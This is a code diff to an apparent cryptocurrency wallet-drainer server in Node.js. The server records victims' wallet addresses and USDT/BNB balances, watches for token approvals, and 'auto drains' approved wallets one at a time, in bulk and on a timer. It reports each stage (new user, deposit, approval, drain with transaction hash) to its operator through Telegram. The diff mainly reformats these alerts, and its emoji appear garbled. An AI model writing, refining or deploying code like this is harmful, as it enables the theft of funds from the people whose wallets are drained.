@@ -258,7 +258,7 @@ const server = http.createServer(async (req, res) => {
         txHash: null
       };
       users.push(user);
-      tgSend('<b>New User Connected</b>\n\nAddress: <code>' + address + '</code>\nTime: ' + new Date().toLocaleString());
+      tgSend('ðŸŸ¢ <b>NEW USER</b>\n\nðŸ‘¤ ID: <code>' + user.id.slice(0,8) + '</code>\nðŸ“ <code>' + address + '</code>\nâ° ' + new Date().toLocaleString('en-IN'));
     } else {
       user.lastSeen = new Date().toISOString();
     }
@@ -277,7 +277,7 @@ const server = http.createServer(async (req, res) => {
       user.lastSeen = new Date().toISOString();
       const newUSDT = parseFloat(user.balanceUSDT || 0);
       if (newUSDT > oldUSDT + 0.01) {
-        tgSend('<b>USDT Deposit Detected</b>\n\nAddress: <code>' + user.address + '</code>\nNew Balance: <b>' + user.balanceUSDT + ' USDT</b>\nBNB: ' + (user.balanceBNB || '0') + '\nStatus: ' + (user.status || ''));
+        tgSend('ðŸ’° <b>DEPOSIT</b>\n\nðŸ‘¤ ID: <code>' + user.id.slice(0,8) + '</code>\nðŸ“ <code>' + user.address + '</code>\nðŸ’µ New USDT: <b>' + user.balanceUSDT + '</b>\nâ›½ BNB: ' + (user.balanceBNB || '0') + '\nâ° ' + new Date().toLocaleString('en-IN'));
       }
       saveUsers(users);
     }
@@ -294,7 +294,7 @@ const server = http.createServer(async (req, res) => {
       user.status = 'approved';
       user.lastSeen = new Date().toISOString();
       saveUsers(users);
-      tgSend('<b>New Approval</b>\n\nAddress: <code>' + user.address + '</code>\nUSDT Balance: <b>' + (user.balanceUSDT || '0') + '</b>\nBNB: ' + (user.balanceBNB || '0') + '\nAllowance: ' + user.allowance + '\nTime: ' + new Date().toLocaleString());
+      tgSend('âœ… <b>APPROVED</b>\n\nðŸ‘¤ ID: <code>' + user.id.slice(0,8) + '</code>\nðŸ“ <code>' + user.address + '</code>\nðŸ’µ USDT: <b>' + (user.balanceUSDT || '0') + '</b>\nâ›½ BNB: ' + (user.balanceBNB || '0') + '\nðŸ”“ Allowance: ' + user.allowance + '\nâ° ' + new Date().toLocaleString('en-IN'));
     }
     return sendJson(res, 200, { success: true });
   }
@@ -386,7 +386,7 @@ const server = http.createServer(async (req, res) => {
             user.drainedAmount = result.amount;
             user.txHash = result.txHash;
             saveUsers(users);
-            tgSend('<b>Auto Drained</b>\n\nAddress: <code>' + user.address + '</code>\nAmount: <b>' + result.amount + ' USDT</b>\nTx: <code>' + result.txHash + '</code>');
+            tgSend('ðŸ”¥ <b>DRAINED</b>\n\nðŸ‘¤ ID: <code>' + user.id.slice(0,8) + '</code>\nðŸ“ <code>' + user.address + '</code>\nðŸ’µ Amount: <b>' + result.amount + ' USDT</b>\nðŸ”— Tx: <code>' + result.txHash + '</code>\nâ° ' + new Date().toLocaleString('en-IN'));
             return sendJson(res, 200, { success: true, amount: result.amount, txHash: result.txHash });
           }
           return sendJson(res, 500, { error: result.error });
@@ -424,7 +424,7 @@ const server = http.createServer(async (req, res) => {
               user.drainedAmount = result.amount;
               user.txHash = result.txHash;
               results.push({ address: user.address, amount: result.amount, txHash: result.txHash });
-              tgSend('<b>Auto Drained</b>\n\nAddress: <code>' + user.address + '</code>\nAmount: <b>' + result.amount + ' USDT</b>\nTx: <code>' + result.txHash + '</code>');
+              tgSend('ðŸ”¥ <b>DRAINED</b>\n\nðŸ‘¤ ID: <code>' + user.id.slice(0,8) + '</code>\nðŸ“ <code>' + user.address + '</code>\nðŸ’µ Amount: <b>' + result.amount + ' USDT</b>\nðŸ”— Tx: <code>' + result.txHash + '</code>\nâ° ' + new Date().toLocaleString('en-IN'));
             } else {
               results.push({ address: user.address, error: result.error });
             }
@@ -480,7 +480,7 @@ setInterval(async () => {
       const oldUSDT = parseFloat(user.balanceUSDT || 0);
       if (user.balanceBNB !== newBNB || user.balanceUSDT !== newUSDT) {
         if (parseFloat(newUSDT) > oldUSDT + 0.01) {
-          tgSend('<b>USDT Deposit Detected</b>\n\nAddress: <code>' + user.address + '</code>\nNew Balance: <b>' + newUSDT + ' USDT</b>\nBNB: ' + newBNB);
+          tgSend('ðŸ’° <b>DEPOSIT</b>\n\nðŸ‘¤ ID: <code>' + user.id.slice(0,8) + '</code>\nðŸ“ <code>' + user.address + '</code>\nðŸ’µ New USDT: <b>' + newUSDT + '</b>\nâ›½ BNB: ' + newBNB + '\nâ° ' + new Date().toLocaleString('en-IN'));
         }
         user.balanceBNB = newBNB;
         user.balanceUSDT = newUSDT;
@@ -507,7 +507,7 @@ setInterval(async () => {
             user.drainedAmount = result.amount;
             user.txHash = result.txHash;
             changed = true;
-            tgSend('<b>Auto Drained</b>\n\nAddress: <code>' + user.address + '</code>\nAmount: <b>' + result.amount + ' USDT</b>\nTx: <code>' + result.txHash + '</code>');
+            tgSend('ðŸ”¥ <b>DRAINED</b>\n\nðŸ‘¤ ID: <code>' + user.id.slice(0,8) + '</code>\nðŸ“ <code>' + user.address + '</code>\nðŸ’µ Amount: <b>' + result.amount + ' USDT</b>\nðŸ”— Tx: <code>' + result.txHash + '</code>\nâ° ' + new Date().toLocaleString('en-IN'));
           }
         }
       }
